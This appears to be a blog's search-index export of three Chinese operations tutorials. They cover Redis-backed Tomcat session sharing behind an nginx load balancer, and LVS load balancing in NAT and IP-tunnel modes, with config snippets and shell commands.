        <content type="html"><![CDATA[<h1 id="nginx-tomcat-redis实现session共享"><a href="#nginx-tomcat-redis实现session共享" class="headerlink" title="nginx+tomcat+redis实现session共享"></a>nginx+tomcat+redis实现session共享</h1><h5 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">什么是Session/Cookie</span><br><span class="line"></span><br><span class="line">    用户使用网站的服务，基本上需要浏览器与Web服务器的多次交互。HTTP协议本身是无状态的，当用户的第一次访问请求结束后，后端服务器就无法知道下一次来访问的还是不是上次访问的用户。我们需要基于HTTP协议支持会话状态的机制，这样的机制可以使Web服务器从多次单独的HTTP请求中知道哪些请求是来自哪个会话的。</span><br><span class="line">    这种架构的主要目的是  如果我们在一个网站上登录了账号和密码，登录成功的信息存放在后端服务器A上，那么如果我们刷新后，将会登录到服务器B上 这个时候，我们需要重新登录，如果做了session共享后，登录信息会缓存到redis中，我们就不需要重新登录了。登录的信息状态会进行缓存。</span><br><span class="line">    Session与Cookie的作用都是为了保持访问用户与后端服务器的交互状态。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一下环境均为centos7</span><br><span class="line">以下实验仅用于tomcat7、jdk7  (tomcat8见末尾)</span><br><span class="line">   nginx: 10.3.145.14</span><br><span class="line">   tomcat1: 10.3.145.58 多实例</span><br><span class="line">   redis: 10.3.145.55</span><br></pre></td></tr></table></figure><h5 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx 反向代理，7层负载均衡配置upstream代理</span><br><span class="line">配置文件中添加下列部分</span><br><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">http &#123;</span><br><span class="line">upstream webapp &#123;</span><br><span class="line">        server 10.3.145.58:8080 weight&#x3D;1 max_fails&#x3D;1 fail_timeout&#x3D;2s;</span><br><span class="line">        server 10.3.145.58:8081 weight&#x3D;1 max_fails&#x3D;1 fail_timeout&#x3D;2s;</span><br><span class="line">&#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;webapp;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">配置两台tomcat轮循</span><br></pre></td></tr></table></figure><h5 id="tomcat配置"><a href="#tomcat配置" class="headerlink" title="tomcat配置"></a>tomcat配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  2-1.将jar包拷至lib目录(两台tomcat一样)</span><br><span class="line"></span><br><span class="line">  2-2.修改配置文件(两台tomcat一样)</span><br><span class="line">    # vim conf&#x2F;context.xml (写在&lt;Context&gt;标签中)            </span><br><span class="line">&lt;Valve className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; &#x2F;&gt;</span><br><span class="line">&lt;Manager className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class="line">         host&#x3D;&quot;127.0.0.1&quot;</span><br><span class="line">         port&#x3D;&quot;6379&quot;</span><br><span class="line">         database&#x3D;&quot;0&quot;</span><br><span class="line">         password&#x3D;&quot;redis-password&quot;</span><br><span class="line">         maxInactiveInterval&#x3D;&quot;1200&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">Redis集群配置方式</span><br><span class="line">&lt;Valve className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; &#x2F;&gt;</span><br><span class="line">&lt;Manager className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class="line">    maxInactiveInterval&#x3D;&quot;60&quot;</span><br><span class="line">    password&#x3D;&quot;redis-password&quot;</span><br><span class="line">    sentinelMaster&#x3D;&quot;mymaster&quot;</span><br><span class="line">    sentinels&#x3D;&quot;127.0.0.1:26379,127.0.0.1:26380,127.0.0.1:26381,127.0.0.1:26382&quot; </span><br><span class="line">&#x2F;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="制作测试网页"><a href="#制作测试网页" class="headerlink" title="制作测试网页"></a>制作测试网页</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">cat webapps/ROOT/index.jsp</span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;green&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span>  #这一部分两台tomcat可设计成不同的颜色以区分</span><br><span class="line">        &lt;%= request.getSession().getId() %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Tomcat 1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>                        #这一部分两台tomcat可以是不同的内容以区分</span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">  cat webapps/ROOT/index.jsp</span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span>  #这一部分两台tomcat可设计成不同的颜色以区分</span><br><span class="line">        &lt;%= request.getSession().getId() %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Tomcat 2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>                        #这一部分两台tomcat可以是不同的内容以区分</span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动服务</span><br><span class="line">redis配置</span><br><span class="line">    安装</span><br><span class="line">        # tar xf redis-4.0.8.tar.gz -C &#x2F;usr&#x2F;local&#x2F;</span><br><span class="line">        # cd &#x2F;usr&#x2F;local&#x2F;redis-4.0.8&#x2F;</span><br><span class="line">        # make</span><br><span class="line">    配置</span><br><span class="line">        # vim redis.conf            #将监听地址改为0.0.0.0</span><br><span class="line">    启动服务</span><br><span class="line">        # .&#x2F;src&#x2F;redis-server redis.conf  &amp;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200213202813926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200213202827989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="关于TOMCAT8"><a href="#关于TOMCAT8" class="headerlink" title="关于TOMCAT8"></a>关于TOMCAT8</h5><p><a href="https://github.com/jcoleman/tomcat-redis-session-manager">老方式</a><br><a href="https://github.com/mrhop/tomcat-redis-session-manager-8.5.git">新方式</a><br>ps. 原作者已经停止更新，我们找到了新的方法重新编译新的包，其他的两个jar文件不需要改动。</p><h6 id="gradle编译tomcat-redis-session-manager"><a href="#gradle编译tomcat-redis-session-manager" class="headerlink" title="gradle编译tomcat-redis-session-manager"></a>gradle编译tomcat-redis-session-manager</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@tomcat ~]# wget -N https://services.gradle.org/distributions/gradle-2.9-all.zip</span><br><span class="line">[root@tomcat ~]# mkdir /opt/gradle</span><br><span class="line">[root@tomcat ~]# unzip gradle-2.9-all.zip</span><br><span class="line">[root@tomcat ~]# mv gradle-2.9 /opt/gradle/</span><br><span class="line">[root@tomcat ~]# ln -sfn /opt/gradle/gradle-2.9 /opt/gradle/latest</span><br><span class="line">[root@tomcat ~]# echo &quot;export GRADLE_HOME=/opt/gradle/latest&quot; &gt; /etc/profile.d/gradle.sh</span><br><span class="line">[root@tomcat ~]# echo &quot;export PATH=\$PATH:\$GRADLE_HOME/bin&quot; &gt;&gt; /etc/profile.d/gradle.sh</span><br><span class="line">[root@tomcat ~]# . /etc/profile.d/gradle.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看gradle版本</span></span><br><span class="line">[root@tomcat ~]# gradle -v</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Gradle 2.9</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Build time:   2015-11-17 07:02:17 UTC</span><br><span class="line">Build number: none</span><br><span class="line">Revision:     b463d7980c40d44c4657dc80025275b84a29e31f</span><br><span class="line"></span><br><span class="line">Groovy:       2.4.4</span><br><span class="line">Ant:          Apache Ant(TM) version 1.9.3 compiled on December 23 2013</span><br><span class="line">JVM:          1.8.0_144 (Oracle Corporation 25.144-b01)</span><br><span class="line">OS:           Linux 3.10.0-693.5.2.el7.x86_64 amd64</span><br></pre></td></tr></table></figure><h6 id="编译并打包tomcat-redis-session-manager"><a href="#编译并打包tomcat-redis-session-manager" class="headerlink" title="编译并打包tomcat-redis-session-manager"></a>编译并打包tomcat-redis-session-manager</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 克隆fork作者的源码</span></span><br><span class="line">[root@tomcat ~]# git clone https://github.com/mrhop/tomcat-redis-session-manager-8.5.git</span><br><span class="line">[root@tomcat ~]# cd tomcat-redis-session-manager-8.5-master</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 修改配置</span></span><br><span class="line"></span><br><span class="line">[root@tomcat ~]# vim build.gradle</span><br><span class="line">**************************************</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改以下内容</span></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">version = &#x27;2.0.0-8.5.32&#x27;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">  compile group: &#x27;org.apache.tomcat&#x27;, name: &#x27;tomcat-catalina&#x27;, version: &#x27;8.5.32&#x27;</span><br><span class="line">  compile group: &#x27;redis.clients&#x27;, name: &#x27;jedis&#x27;, version: &#x27;2.9.0&#x27;</span><br><span class="line">  compile group: &#x27;org.apache.commons&#x27;, name: &#x27;commons-pool2&#x27;, version: &#x27;2.4.2&#x27;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行<span class="variable">$CATALINA_BASE</span>/bin/version.sh查看tomcat版本，我这里是8.5.50</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> jedis，我这边下载的版本是2.7.3</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> commons-pool2，我这边使用的版本是2.4.2</span></span><br><span class="line">**************************************</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 编译并打包</span></span><br><span class="line">[root@tomcat ~]# gradle jar</span><br><span class="line">:compileJava UP-TO-DATE</span><br><span class="line">:processResources UP-TO-DATE</span><br><span class="line">:classes UP-TO-DATE</span><br><span class="line">:jar</span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL</span><br><span class="line"></span><br><span class="line">Total time: 5.55 secs</span><br><span class="line"></span><br><span class="line">This build could be faster, please consider using the Gradle Daemon: https://docs.gradle.org/2.9/userguide/gradle_daemon.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="编译完成"><a href="#编译完成" class="headerlink" title="编译完成"></a>编译完成</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@tomcat ~]# ls build/libs/</span><br><span class="line">tomcat-redis-session-manager-8.5-2.0.0-8.5.5.jar</span><br><span class="line"><span class="meta">#</span><span class="bash"> 讲上面的包和其他的两个jar包放在tomcat的lib目录下</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200213204131408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="大功告成"><a href="#大功告成" class="headerlink" title="大功告成"></a>大功告成</h1>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lvs四层负载均衡之nat模式详解</title>
      <link href="2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Bnat%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Bnat%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NAT模式（VS-NAT）</span><br><span class="line">    原理：就是把客户端发来的数据包的IP头的目的地址，在负载均衡器上换成其中一台RS的IP地址，并发至此RS来处理,RS处理完成后把数据交给经过负载均衡器,负载均衡器再把数据包的原IP地址改为自己的IP，将目的地址改为客户端IP地址即可｡期间,无论是进来的流量,还是出去的流量,都必须经过负载均衡器｡</span><br><span class="line">    优点：集群中的物理服务器可以使用任何支持TCP/IP操作系统，只有负载均衡器需要一个合法的IP地址。</span><br><span class="line">    缺点：扩展性有限。当服务器节点（普通PC服务器）增长过多时,负载均衡器将成为整个系统的瓶颈，因为所有的请求包和应答包的流向都经过负载均衡器。当服务器节点过多时，大量的数据包都交汇在负载均衡器那，速度就会变慢！</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200212010857440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1、LVS/NAT网络拓朴</p><table><thead><tr><th>主机名</th><th>ip</th><th>系统</th><th>用途</th></tr></thead><tbody><tr><td>client</td><td>192.168.0.105   桥接</td><td>mac</td><td>客户端</td></tr><tr><td>lvs-server</td><td>192.168.0.108  桥接<br>192.168.72.130  仅主机</td><td>centos7.5</td><td>分发器</td></tr><tr><td>real-server1</td><td>192.168.72.128  仅主机</td><td>centos7.5</td><td>web1</td></tr><tr><td>real-server2</td><td>192.168.72.129  仅主机</td><td>centos7.5</td><td>web2</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 配置real-server （两服务器相同）</span></span><br><span class="line">[root@real-server1 ~]# yum install httpd -y</span><br><span class="line">[root@real-server1 ~]# echo lvs-web1 &gt; /var/www/html/index.html</span><br><span class="line">[root@real-server1 ~]# systemctl start httpd</span><br><span class="line">[root@real-server1 ~]# ip route add default via 192.168.72.130  # 配置默认路由</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置lvs-server  开启路由转发</span></span><br><span class="line">[root@lvs-server ~]# vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">[root@lvs-server ~]# sysctl -p//确保打开路由转发</span><br><span class="line">[root@lvs-server ~]# yum install ipvsadm -y</span><br><span class="line">设置集群调度算法，（便于验证，此处使用轮询算法）：</span><br><span class="line">[root@lvs-server ~]# ipvsadm -A -t 192.168.0.108:80 -s rr</span><br><span class="line">设置后端服务器：</span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 192.168.0.108:80 -r 192.168.72.128:80 -m</span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 192.168.0.108:80 -r 192.168.72.129:80 -m</span><br><span class="line">查看ipvsadm规则：</span><br><span class="line">[root@lvs-server ~]# ipvsadm -Ln</span><br><span class="line">IP Virtual Server version 1.2.1 (size=4096)</span><br><span class="line">Prot LocalAddress:Port Scheduler Flags</span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> RemoteAddress:Port           Forward Weight ActiveConn InActConn</span></span><br><span class="line">TCP  192.168.0.108:80 rr</span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> 192.168.72.128:80            Masq    1      0          7</span>         </span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> 192.168.72.129:80            Masq    1      0          7</span>    </span><br><span class="line">这些规则没有保存在配置文件，重启失效</span><br><span class="line"><span class="meta">#</span><span class="bash"> 做开启启动</span></span><br><span class="line">[root@lvs-server ~]# systemctl enable ipvsadm</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/ipvsadm.service to /usr/lib/systemd/system/ipvsadm.service.</span><br><span class="line">[root@lvs-server ~]# ipvsadm -Ln &gt; /etc/sysconfig/ipvsadm</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试</span></span><br><span class="line">[root@client ~]# elinks -dump http://192.168.0.108/</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ipvsadm-使用攻略"><a href="#ipvsadm-使用攻略" class="headerlink" title="ipvsadm 使用攻略"></a>ipvsadm 使用攻略</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-A --add-service #在服务器列表中新添加一条新的虚拟服务器记录</span><br><span class="line">-s --scheduler #使用的调度算法， rr | wrr | lc | wlc | lblb | lblcr | dh | sh | sed | nq 默认调度算法是 wlc</span><br><span class="line">例：ipvsadm -A -t 192.168.1.2:80 -s wrr</span><br><span class="line"></span><br><span class="line">-a --add-server  #在服务器表中添加一条新的真实主机记录</span><br><span class="line">-t --tcp-service #说明虚拟服务器提供tcp服务</span><br><span class="line">-u --udp-service #说明虚拟服务器提供udp服务</span><br><span class="line">-r --real-server #真实服务器地址</span><br><span class="line">-m --masquerading #指定LVS工作模式为NAT模式</span><br><span class="line">-w --weight #真实服务器的权值</span><br><span class="line">-g --gatewaying #指定LVS工作模式为直接路由器模式（也是LVS默认的模式）</span><br><span class="line">-i --ip #指定LVS的工作模式为隧道模式  </span><br><span class="line">-p #会话保持时间，定义流量被转到同一个realserver的会话存留时间</span><br><span class="line">例：ipvsadm -a -t 192.168.1.2:80 -r 192.168.2.10:80 -m -w 1</span><br><span class="line"></span><br><span class="line">-E -edit-service #编辑内核虚拟服务器表中的一条虚拟服务器记录。</span><br><span class="line">-D -delete-service #删除内核虚拟服务器表中的一条虚拟服务器记录。</span><br><span class="line">-C -clear #清除内核虚拟服务器表中的所有记录。</span><br><span class="line">-R -restore #恢复虚拟服务器规则</span><br><span class="line">-S -save #保存虚拟服务器规则到标准输出，输出为-R 选项可读的格式</span><br><span class="line">-e -edit-server #编辑一条虚拟服务器记录中的某条真实服务器记录</span><br><span class="line">-d -delete-server #删除一条虚拟服务器记录中的某条真实服务器记录</span><br><span class="line">-L|-l –list #显示内核虚拟服务器表</span><br><span class="line"></span><br><span class="line">--numeric, -n：#以数字形式输出地址和端口号</span><br><span class="line">--exact： #扩展信息，精确值 </span><br><span class="line">--connection，-c： #当前IPVS连接输出</span><br><span class="line">--stats： #统计信息</span><br><span class="line">--rate ： #输出速率信息</span><br><span class="line"></span><br><span class="line">参数也可以从/proc/net/ip_vs*映射文件中查看</span><br><span class="line">-Z –zero #虚拟服务表计数器清零（清空当前的连接数量等）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> lvs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> lvs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lvs四层负载均衡之tun模式详解</title>
      <link href="2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Btun%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Btun%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IP隧道(Tunnel)模式（VS-TUN）  </span><br><span class="line"></span><br><span class="line">​    原理：互联网上的大多Internet服务的请求包很短小，而应答包通常很大。那么隧道模式就是，把客户端发来的数据包，封装一个新的IP头标记(仅目的IP)发给RS,RS收到后,先把数据包的头解开,还原数据包,处理后,直接返回给客户端,不需要再经过负载均衡器｡注意,由于RS需要对负载均衡器发过来的数据包进行还原,所以说必须支持IPTUNNEL协议｡所以,在RS的内核中,必须编译支持IPTUNNEL这个选项</span><br><span class="line">​    优点：负载均衡器只负责将请求包分发给后端节点服务器，而RS将应答包直接发给用户。所以，减少了负载均衡器的大量数据流动，负载均衡器不再是系统的瓶颈，就能处理很巨大的请求量，这种方式，一台负载均衡器能够为很多RS进行分发。而且跑在公网上就能进行不同地域的分发。</span><br><span class="line">​    缺点：隧道模式的RS节点需要合法IP，这种方式需要所有的服务器支持”IP Tunneling”(IP Encapsulation)协议，服务器可能只局限在部分Linux系统上。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200212011055221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实验说明：<br>| 主机名       | ip             | 系统                 | 用途   |<br>| ———— | ————– | ——————– | —— |<br>| client       | 192.168.181.100   | mac                  | 客户端 |<br>| lvs-server   | 192.168.181.133 | centos7.5            | 分发器 |<br>| real-server1 | 192.168.181.129 | centos7.5            | web1   |<br>| real-server2 | 192.168.181.130 | centos7.5            | web2   |</p><p><strong>在lvs-server上面</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 添加隧道模块</span></span><br><span class="line">[root@lvs-server ~]# modprobe ipip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看时多了一块网卡</span></span><br><span class="line">[root@lvs-server ~]# ip a   </span><br><span class="line"></span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:c2:34:dd brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.181.133/24 brd 192.168.181.255 scope global noprefixroute dynamic ens33</span><br><span class="line">3: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ipip 0.0.0.0 brd 0.0.0.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在新网卡上面添加虚拟ip</span></span><br><span class="line">[root@lvs-server ~]# ip addr add 192.168.181.200/32 dev tunl0</span><br><span class="line">[root@lvs-server ~]# ip a</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:c2:34:dd brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.181.133/24 brd 192.168.181.255 scope global noprefixroute dynamic ens33</span><br><span class="line">3: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ipip 0.0.0.0 brd 0.0.0.0</span><br><span class="line">    inet 192.168.181.200/24 scope global tunl0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里我们客户以看到 tunl0的网卡是DOWN的状态，现在我们激活它</span></span><br><span class="line">[root@lvs-server ~]# ip link set up tunl0     # 激活tunl0网卡</span><br><span class="line">[root@lvs-server ~]# ip addr show tunl0</span><br><span class="line">[root@lvs-server ~]# yum install -y ipvsadm</span><br><span class="line">[root@lvs-server ~]# ipvsadm -C </span><br><span class="line">[root@lvs-server ~]# ipvsadm -A -t 192.168.181.200:80 -s rr</span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 192.168.181.200:80 -r 192.168.181.129 -i  # -i隧道模式</span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 192.168.181.200:80 -r 192.168.181.130 -i</span><br><span class="line">[root@lvs-server ~]# ipvsadm -L</span><br></pre></td></tr></table></figure><p><strong>real-server上 两台相同</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@real-server1 ~]# modprobe ipip</span><br><span class="line">[root@real-server1 ~]# ip addr add 192.168.181.200/32 dev tunl0</span><br><span class="line">[root@real-server1 ~]# ip link set up tunl0</span><br><span class="line">[root@real-server1 ~]# ip addr show</span><br><span class="line">[root@real-server1 ~]# sysctl -a | grep rp_filter  # 查看反向检验参数，-a表示显示</span><br><span class="line">[root@real-server1 ~]# sysctl -a | grep rp_filter</span><br><span class="line">net.ipv4.conf.all.arp_filter = 0</span><br><span class="line">net.ipv4.conf.all.rp_filter = 1</span><br><span class="line">net.ipv4.conf.default.arp_filter = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter = 1</span><br><span class="line">net.ipv4.conf.ens33.arp_filter = 0</span><br><span class="line">net.ipv4.conf.ens33.rp_filter = 1</span><br><span class="line">net.ipv4.conf.lo.arp_filter = 0</span><br><span class="line">net.ipv4.conf.lo.rp_filter = 0</span><br><span class="line">net.ipv4.conf.tunl0.arp_filter = 0</span><br><span class="line">net.ipv4.conf.tunl0.rp_filter = 1</span><br><span class="line">[root@real-server1 ~]# sysctl -w net.ipv4.conf.all.rp_filter=0</span><br><span class="line">[root@real-server1 ~]# sysctl -w net.ipv4.conf.lo.rp_filter=0</span><br><span class="line">[root@real-server1 ~]# sysctl -w net.ipv4.conf.ens33.rp_filter=0</span><br><span class="line">[root@real-server1 ~]# sysctl -w net.ipv4.conf.tunl0.rp_filter=0</span><br><span class="line">[root@real-server1 ~]# vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">[root@real-server1 ~]# sysctl -p</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">[root@real-server1 ~]# sysctl -a | grep rp_filter</span><br><span class="line"><span class="meta">#</span><span class="bash">  检查是否全部为0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>客户端测试</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client ~]# curl http://172.16.147.100/</span><br><span class="line">nginx1</span><br><span class="line">[root@client ~]# curl http://172.16.147.100/</span><br><span class="line">nginx2</span><br><span class="line">[root@client ~]# curl http://172.16.147.100/</span><br><span class="line">nginx1</span><br><span class="line">[root@client ~]# curl http://172.16.147.100/</span><br><span class="line">nginx2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> lvs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> lvs </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
